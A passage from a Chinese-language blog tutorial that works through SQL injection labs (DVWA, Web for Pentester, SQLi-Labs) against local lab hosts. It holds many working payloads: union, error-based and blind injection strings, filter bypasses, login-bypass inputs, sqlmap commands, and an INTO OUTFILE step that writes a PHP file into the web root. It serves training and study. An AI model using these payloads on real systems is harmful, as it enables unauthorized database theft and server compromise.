(default)[2] BlackBerry 9900[3] Google Nexus 7[4] HP iPAQ 6365[5] HTC Sensation[6] Nokia N97[7] Samsung Galaxy S&gt; 1[...] 延时相关123456--time-sec=TIMESEC 延迟 DBMS 的响应秒数（默认为 5）--delay=DELAY 设置每个 HTTP 请求的延迟秒数--timeout=TIMEOUT 设置连接响应的有效秒数（默认为 30）--retries=RETRIES 连接超时时重试次数（默认为 3）--proxy=PROXY 使用代理连接目标 URL--proxy=socks5://127.0.0.1:1086 DVWA 注入SQL Injection SQL 注入Low123456789$id = $_REQUEST[ 'id' ]# 没有过滤就直接带入 SQL 语句中 使用单引号闭合$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";while( $row = mysqli_fetch_assoc( $result ) ) &#123; // 回显信息 $first = $row["first_name"]; $last = $row["last_name"]; $html .= "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; 因为之前输完 SQLi-Labs 靶场了，从源码中来看这里使用最基本的 Union 联合查询注入效率最高，国光这里直接丢最终注入的 Payload 吧： 1/sqli/?id=-1&apos; union select 1,(SELECT+GROUP_CONCAT(user,&apos;:&apos;,password+SEPARATOR+0x3c62723e)+FROM+users)--+&amp;Submit=Submit# Medium和 Low 级别不一样的代码主要区别如下： 123$id = $_POST[ 'id' ];$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 可以看到从 GET 型注入变成了 POST 型注入，而且闭合方式不一样，从单引号变成直接拼接到 SQL 语句了。 POST 的数据内容如下： 1id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)&amp;Submit=Submit High主要代码如下: 123$id = $_SESSION[ 'id' ];$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; 从 SESSION 获取 id 值，使用单引号拼接。因为 SESSION 获取值的特点，这里不能直接在当前页面注入， input 的输入框内容如下： 1-2&apos; union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)# Impossible这个级别的主要防护代码如下： 123456789101112// Anti-CSRF token 防御 CSRF 攻击checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );$id = $_GET[ 'id' ];// 检测是否是数字类型if(is_numeric( $id )) &#123; // 预编译 $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); CSRF、检测 id 是否是数字 prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。 SQL Injection (Blind) SQL 盲注盲注是一个比较耗时的工作，因为之前刷完靶场了，国光这里打算使用 sqlmap 演示一下点到为止，感兴趣的朋友建议去系统地刷下 SQLi-Labs 靶场。 Low主要区别在这里： 1234if( $num &gt; 0 ) &#123; // 查询到结果 只输出如下信息 $html .= '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;';&#125; 下面尝试直接使用 sqlmap 进行注入： 1sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#" --cookie="PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=low" --dbms=MySQL --technique=B --random-agent --flush-session -v 3 因为 DVWA 是有登录机制的，所以这里手动指定 –cookie 来进行会话认证 Medium同理也是没有直接输出查询结果的，这里和普通的注入类似，那么这里依然还是直接使用 sqlmap 进行注入： 1sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=medium" --data="id=1*&amp;Submit=Submit" --dbms=MySQL --technique=B --random-agent --flush-session -v 3 High123$id = $_COOKIE[ 'id' ];$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; 这里是从 Cookie 中获取 id 然后导入到数据库中查询的，那么知道注入点之后依然可以使用 sqlmap 来进行注入： 1sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="id=1*; PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=high" --dbms=MySQL --technique=B --random-agent --flush-session -v 3 Impossible和上面的关卡一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入。 Web for Pentester SQL注入系列Example 1 基础注入关键代码： 123456789101112$sql = "SELECT * FROM users where name='";$sql .= $_GET["name"]."'";$result = mysql_query($sql);if ($result) &#123; while ($row = mysql_fetch_assoc($result)) echo "&lt;tr&gt;"; echo "&lt;td&gt;".$row['id']."&lt;/td&gt;"; echo "&lt;td&gt;".$row['name']."&lt;/td&gt;"; echo "&lt;td&gt;".$row['age']."&lt;/td&gt;"; echo "&lt;/tr&gt;";&#125;echo "&lt;/table&gt;"; 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 name=’X’ 那么就直接丢 payload 吧： 1example1.php?name=x&apos; union select 1,2,(SELECT+GROUP_CONCAT(name,&quot;:&quot;,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5--+ Example 2 过滤空格关键代码： 123456if (preg_match('/ /', $_GET["name"])) &#123; die("ERROR NO SPACE"); &#125;$sql = "SELECT * FROM users where name='";$sql .= $_GET["name"]."'";$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 name=’X’ 和 Example 1 基本上一致，只是这里过滤了 空格，如果匹配到空格的话，直接就终止函数。 过滤空格可以尝试通过下面的字符来替代： %09 TAB 键（水平） %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键（垂直） %a0 空格 /**/ 多行注释 最终的 payload 如下： 1example2.php?name=x&apos;/**/union/**/select/**/1,2,(SELECT/**/GROUP_CONCAT(name,&quot;:&quot;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),4,5%23 Example 3 过滤连续空格关键代码： 123456if (preg_match('/\s+/', $_GET["name"])) &#123; die("ERROR NO SPACE"); &#125;$sql = "SELECT * FROM users where name='";$sql .= $_GET["name"]."'";$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 where name=’X’ 来过滤一个或多个连续空格。但是，我仍然可以使用多行注释/**/ 或者 Example 2 其他字符来 Bypass 1example3.php?name=x&apos;/**/union/**/select/**/1,2,(SELECT/**/GROUP_CONCAT(name,&quot;:&quot;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),4,5%23 sqlmap 也有内置的 tamper 可以直接使用： 1sqlmap -u "http://10.211.55.20/sqli/example3.php?name=root*%23" --technique=U --dbms=MySQL --tamper="space2comment" --random-agent --flush-session -v 3 --level=3 Example 4 画蛇添足的过滤关键代码： 1234# id 直接拼接到 SQL 语句中$sql="SELECT * FROM users where id=";$sql.=mysql_real_escape_string($_GET["id"])." ";$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 where id = X mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符：\，&#39;，&quot;，那么问题来了 这一题中并没有使用引号来闭合，所以注入的时候我们也不需要引号，所以实际上这个函数并没有发挥作用，下面正常进行注入吧： 1example4.php?id=-2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5 Example 5 画蛇添足的正则关键代码： 1234567if (!preg_match('/^[0-9]+/', $_GET["id"])) &#123; die("ERROR INTEGER REQUIRED"); &#125;$sql = "SELECT * FROM users where id=";$sql .= $_GET["id"] ;$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 where id = X 参数 id 必须是数字开头，否则直接终止函数运行。不过实际手工注入的时候默认 id 是满足这个条件的，除非我们手动修改这个 id 的值： 1example5.php?id=2 and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5 这里不能用 id=-2 来构造报错了，因为正则限制 id 必须是数字开题，所以这里使用了 and 1=2 来构造报错。不过实际上这里不用构造报错也可以的，因为页面不止显示一条查询信息，但是由于注入习惯的原因，国光我这里喜欢构造报错。 Example 6 画蛇添足的正则 again关键代码： 1234567if (!preg_match('/[0-9]+$/', $_GET["id"])) &#123; die("ERROR INTEGER REQUIRED");&#125;$sql = "SELECT * FROM users where id=";$sql .= $_GET["id"] ;$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 where id = X 这里和 Example 5 差不多，只是这里确保 id 的值以数字结束，看看我们的上一关的 payload: 1example6.php?id=2 and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5 恰巧是以数字 5 结束，所以这个正则就很画蛇添足 Example 7 /m 正则缺陷 Bypass 请求方式 注入类型 闭合方式 GET 联合、布尔盲注、延时盲注 where id = X 关键代码： 1234567if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) &#123; die("ERROR INTEGER REQUIRED");&#125;$sql = "SELECT * FROM users where id=";$sql .= $_GET["id"];$result = mysql_query($sql); id 只允许 233 或者 -233 这样的形式，这样肯定是无法进行注入的了。天无绝人之路，仔细观察 这里使用了 /m ，/m表示开启多行匹配模式，正常情况下^ 和$ 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配每行的开头和结尾。我们常用： %0A 换行 来绕过 /m 模式的正则检测，完整的 payload 如下： 1example7.php?id=-2%0a union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5 使用 sqlmap 也是可以正常进行注入的： 1sqlmap -u "http://10.211.55.20/sqli/example7.php?id=2" --technique=U --dbms=MySQL --prefix="%0a" --random-agent --flush-session -v 3 Example 8 order by 盲注关键代码： 123$sql = "SELECT * FROM users ORDER BY `";$sql .= mysql_real_escape_string($_GET["order"])."`";$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 布尔盲注、延时盲注 order by X order by 不同于 where 后的注入点，不能使用 union 等进行注入。不过注入方式也十分灵活，下面在本关来详细讲解一下。这里并没有输出报错日志，这里只能使用盲注，效率要低一些，国光这里使用布尔类型盲注来简单尝试一下： 12345678910# 数据库第 1 位的 ascii 码为 101 即 eexample8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))--+example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))--+# 数据库第 2 位的 ascii 码为 120 即 xexample8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))--+example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))--+... 直接用 sqlmap 当然也是可以跑起来的： 1sqlmap -u "http://10.211.55.20/sqli/example8.php?order=name" --technique=B --dbms=MySQL --prefix='`' --random-agent --flush-session -v 3 --level 3 Example 9 order by 盲注关键代码： 123$sql = "SELECT * FROM users ORDER BY ";$sql .= mysql_real_escape_string($_GET["order"]);$result = mysql_query($sql); 请求方式 注入类型 闭合方式 GET 布尔盲注、延时盲注 order by X 比 Example 8 更简单，这里没有奇怪的闭合拼接方式就直接导入到 SQL 语句中了，下面直接开始注入吧： 123456789# 数据库第 1 位的 ascii 码为 101 即 eexample9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))# 数据库第 2 位的 ascii 码为 120 即 xexample9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END)) 直接用 sqlmap 当然也是可以跑起来的： 1sqlmap -u "http://10.211.55.20/sqli/example9.php?order=name" --technique=B --dbms=MySQL --random-agent --flush-session -v 3 Sqli-labs 靶场通关记录基础挑战 1-20 关Less-1 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 源码简单分析： 12345678# 单引号拼接$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";# 支持联合、报错、布尔盲注、延时盲注if true: 输出查询内容else: print_r(mysql_error()); 联合查询注入1?id=-1&apos;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ 报错注入1手动修改 LIMIT+0,1 来进行结果偏移 1?id=1&apos;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ 报错注入2手动修改 LIMIT+0,1 来进行结果偏移 1?id=1&apos;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1--+ 布尔盲注数据库第一个字母为 s 12?id=1&apos; and left(database(),1)&gt;&apos;r&apos;--+?id=1&apos; and left(database(),1)&gt;&apos;s&apos;--+ 延时盲注数据库第一个字母的 ascii 码为 115，即s 12?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ sqlmap联合查询注入 1sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 报错注入 1sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=E -v 3 布尔盲注 1sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=B -v 3 延时盲注 1sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=T -v 3 Less-2 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=$id 和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。 Less-3 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=(&#39;$id&#39;) 和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。 Less-4 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=(&quot;$id&quot;) 源码简单分析： 123456789# 先双引号 在括号拼接$id = '"' . $id . '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";# 支持联合、报错、布尔盲注、延时盲注if true: 输出查询内容else: print_r(mysql_error()); Less-5 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=&#39;$id&#39; 源码简单分析： 12345678# 直接单引号拼接$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";# 支持报错、布尔盲注、延时盲注if true: 输出 You are in...........else: print_r(mysql_error()); 因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致，这里即不再啰嗦了。 Less-6 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=&quot;$id&quot; 和 Less-5 利用方式一致，只是闭合方式不一样，这里即不再啰嗦了。 Less-7 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=((&#39;$id&#39;)) 源码简单分析： 123456789# 使用单引号加双层括号拼接$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";# 支持布尔盲注、延时盲注if true: 输出 You are in.... Use outfile......else: 输出 You have an error in your SQL syntax //print_r(mysql_error()); 因为这里把print_r(mysql_error());给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。 盲注盲注还是常规思路，这里实际上和前面的是一样的，就再啰嗦一下，使用 sqlmap 直接验证看看： 布尔盲注 1sqlmap -u "http://127.0.0.1:8888/Less-7/?id=1" --dbms=MySQL --random-agent --flush-session --technique=B -v 3 sqlmap 的 Payload 如下： 1id=1&apos;) AND 3542=3542 AND (&apos;rmsD&apos;=&apos;rmsD 延时盲注 1sqlmap -u "http://127.0.0.1:8888/Less-7/?id=1" --dbms=MySQL --random-agent --flush-session --technique=T -v 3 sqlmap 的 Payload 如下： 1id=1&apos;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&apos;QUpy&apos;=&apos;QUpy 导出数据到文件因为这一关作者很明显地提示了如下信息： 1You are in.... Use outfile...... 所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下，这个 Docker 靶机理论上应该是开启的，进入容器验证一下： 1234567# mysql -e "show global variables like '%secure%';"+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_auth | OFF || secure_file_priv | |+------------------+-------+ ure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出 当secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv 的值为 空 时，表示不对 mysqld 的导入|导出做限制 下面开始直接将数据库里面的信息导出到文件中吧： 1/?id=1&apos;))+UNION+SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+ 因为导出没有指定路径，所以 Linux 下 MySQL 默认导出的路径为： 1/var/lib/mysql/security 查看下是否将数据库信息导出到文件中了： 1234567891011121314$ cat /var/lib/mysql/security/users.txt1 Dumb Dumb2 Angelina I-kill-you3 Dummy p@ssword4 secure crappy5 stupid stupidity6 superman genious7 batman mob!le8 admin admin9 admin1 admin110 admin2 admin211 admin3 admin312 dhakkan dumbo14 admin4 admin4 但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。 所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看： 1/?id=1&apos;))+UNION+SELECT * from security.users INTO OUTFILE &quot;/var/www/html/Less-7/users.txt&quot;--+ 这里因为这个 Docker 靶场环境没有配置好权限问题，我们通过 MySQL 直接往 Web 目录下写文件会是失败的，提示如下信息： 1syntaxCan't create/write to file 这个时候为了演示这个效果，这里只能进容器来手动把权限给开一下了： 1chmod -R 777 /var/www/html 然后再执行上面的语句应该是可以成功的 1234567891011121314$ curl http://127.0.0.1:8888/Less-7/users.txt1 Dumb Dumb2 Angelina I-kill-you3 Dummy p@ssword4 secure crappy5 stupid stupidity6 superman genious7 batman mob!le8 admin admin9 admin1 admin110 admin2 admin211 admin3 admin312 dhakkan dumbo14 admin4 admin4 一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高： 1/?id=1'))+UNION+SELECT 1,2,"&lt;?php phpinfo();?&gt;" INTO OUTFILE "/var/www/html/Less-7/info.php"--+ 访问对应的 URL 看看是否解析了呢： Less-8 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=&#39;$id&#39; 和 Less-7 注入方式一致，只是拼接方式不一样，这里国光就不再啰嗦了。 Less-9 请求方式 注入类型 拼接方式 GET 延时盲注 id=&#39;$id&#39; 和 Less-7 注入方式一致，只是拼接方式不一样，这里国光就不再啰嗦了。 源码简单分析： 12345678# 使用单引号拼接$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";# 支持延时盲注if true: 输出 You are in............else: 输出 You are in........... 从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入。延时注入细节可以参考 Less-1 的注入细节。 Less-10 请求方式 注入类型 拼接方式 GET 延时盲注 id=&quot;$id&quot; 源码简单分析： 123456789# 先使用双引号再直接拼接$id = '"'.$id.'"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";# 支持延时盲注if true: 输出 You are in............else: 输出 You are in........... 和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9 Less-11 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=&#39;x&#39; 源码简单分析： 1234567891011# POST 方式接受变量$uname=$_POST['uname'];$passwd=$_POST['passwd'];# 使用单引号拼接 SQL@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";if true: 输出查询的信息else: print_r(mysql_error()); 和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。 万能密码这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下： 123456mysql&gt; select * from users where username = 'admin';+----+----------+----------+| id | username | password |+----+----------+----------+| 8 | admin | admin |+----+----------+----------+ 因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统： 12345678910111213# 注释掉 passwd 来登录uname=admin'--+&amp;passwd=&amp;submit=Submituname=admin'#&amp;passwd=&amp;submit=Submit# 注释后面语句 并 添加一个永真条件uname=admin&amp;passwd=1' or 1--+&amp;submit=Submituname=admin&amp;passwd=1'||1--+&amp;submit=Submituname=admin&amp;passwd=1' or 1#&amp;submit=Submituname=admin&amp;passwd=1'||1#&amp;submit=Submit# 闭合后面语句 并 添加一个永真条件uname=admin&amp;passwd=1'or'1'='1&amp;submit=Submituname=admin&amp;passwd=1'||'1'='1&amp;submit=Submit 因为这是一个 POST 型的注入，那么国光这里就再啰嗦一遍，走一遍详细的流程吧 联合查询注入 POST 数据里面不能有 +，这里得手动转换为空格 1uname=admin&amp;passwd=1&apos;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit=Submit 报错注入1手动修改 LIMIT+0,1 来进行结果偏移 1uname=admin&amp;passwd=1&apos;AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit 报错注入2手动修改 LIMIT+0,1 来进行结果偏移 1uname=admin&amp;passwd=1&apos; AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(username AS CHAR),0x27,0x7e) FROM users LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1#&amp;submit=Submit 布尔盲注数据库第一个字母为 s 12uname=admin&apos; and left(database(),1)&gt;&apos;r&apos;#&amp;passwd=&amp;submit=Submituname=admin&apos; and left(database(),1)&gt;&apos;s&apos;#&amp;passwd=&amp;submit=Submit 延时盲注数据库第一个字母的 ascii 码为 115，即s 12uname=admin&apos; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd=&amp;submit=Submituname=admin&apos; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd=&amp;submit=Submit sqlmap加载目标 可以直接将 Burpsuite 截取的数据包内容保持为文本格式 test.txt： 12345678910111213POST /Less-11/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1:8888/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 38Connection: closeUpgrade-Insecure-Requests: 1uname=admin&amp;passwd=2333&amp;submit=Submit 然后直接使用 sqlmap 的 -r 参数来加载这个请求包： 1sqlmap -r test.txt 也可以手动通过 --data 来对 POST 的数据包内容进行注入检测： 1sqlmap -u "http://127.0.0.1:8888/Less-11/" --data="uname=admin&amp;passwd=2333&amp;submit=Submit" 实际上 --data 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来国光我都使用 --data 这个参数来进行注入 🤓 联合查询注入 1sqlmap -u "http://127.0.0.1:8888/Less-11/" --data="uname=admin&amp;passwd=2333&amp;submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 报错注入 1sqlmap -u "http://127.0.0.1:8888/Less-11/" --data="uname=admin&amp;passwd=2333&amp;submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=B -v 3 布尔盲注 1sqlmap -u "http://127.0.0.1:8888/Less-11/" --data="uname=admin&amp;passwd=2333&amp;submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=B -v 3 延时盲注 1sqlmap -u "http://127.0.0.1:8888/Less-11/" --data="uname=admin&amp;passwd=2333&amp;submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=T -v 3 Less-12 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=(&quot;x&quot;) 和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。 Less-13 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 username=(&#39;x&#39;) 简单源码分析 1234567891011# POST 方式接受变量$uname=$_POST['uname'];$passwd=$_POST['passwd'];# 使用单引号和括号来拼接 SQL@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";if true: 并没有输出啥信息else: print_r(mysql_error()); 因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。 Less-14 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 username=&quot;x&quot; 简单源码分析 1234# 先使用 双引号 再直接带入 SQL 语句$uname='"'.$uname.'"';$passwd='"'.$passwd.'"';@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"; 和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。 Less-15 请求方式 注入类型 拼接方式 POST 布尔盲注、延时盲注 username=&#39;x&#39; 源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。 国光这里不再做重复无意义的记录了。 Less-16 请求方式 注入类型 拼接方式 POST 布尔盲注、延时盲注 username=(&quot;x&quot;) 和 Less-15 注入类型一致，更换对应的闭合方式即可。 Less-17 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 password = &#39;$passwd&#39; 简单源码分析: 12345678910111213# uname 参数被过滤了$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];# SELECT 语句只获取了 uname 参数 但是被过滤了 没戏@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";if select 结果正确: # 更新语句 使用单引号拼接 passwd $update="UPDATE users SET password = '$passwd' WHERE username='$row1'"; if mysql 报错: print_r(mysql_error()); 从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧： 1uname=admin&amp;passwd=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit Less-18 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 VALUES (&#39;$uagent&#39;) 简单源码分析: 123456789101112131415161718# 获取请求的 uagent 和 ip 地址$uagent = $_SERVER['HTTP_USER_AGENT'];$IP = $_SERVER['REMOTE_ADDR'];if 输入了uname 和 passwd: # 对这两个参数进行过滤 $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); $sql="SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"; if SQL语句有返回结果: # 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤 $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"; 输出 $uagent; print_r(mysql_error()); else: print_r(mysql_error()); 这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。 PHP 里用来获取客户端 IP 的变量 $_SERVER[&#39;HTTP_CLIENT_IP&#39;] 这个很少使用，不一定服务器都实现了。客户端可以伪造。 $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]，客户端可以伪造。 